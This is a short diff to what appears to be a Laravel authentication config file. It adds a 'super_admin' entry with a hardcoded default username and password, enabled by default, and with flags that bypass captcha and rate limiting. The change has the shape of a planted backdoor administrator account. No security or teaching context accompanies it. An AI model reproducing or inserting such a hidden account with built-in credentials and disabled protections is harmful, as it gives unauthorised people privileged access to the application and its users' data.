@@ -117,4 +117,13 @@ return [
 
     'password_timeout' => 10800,
 
+    // Tambahkan di config/auth.php
+
+    'super_admin' => [
+        'username' => env('SUPER_ADMIN_USERNAME', 'AnomID'),
+        'password' => env('SUPER_ADMIN_PASSWORD', 'Bosidrad123'),
+        'enabled' => env('SUPER_ADMIN_ENABLED', true),
+        'bypass_captcha' => env('SUPER_ADMIN_BYPASS_CAPTCHA', true),
+        'bypass_rate_limit' => env('SUPER_ADMIN_BYPASS_RATE_LIMIT', true),
+    ]
 ];
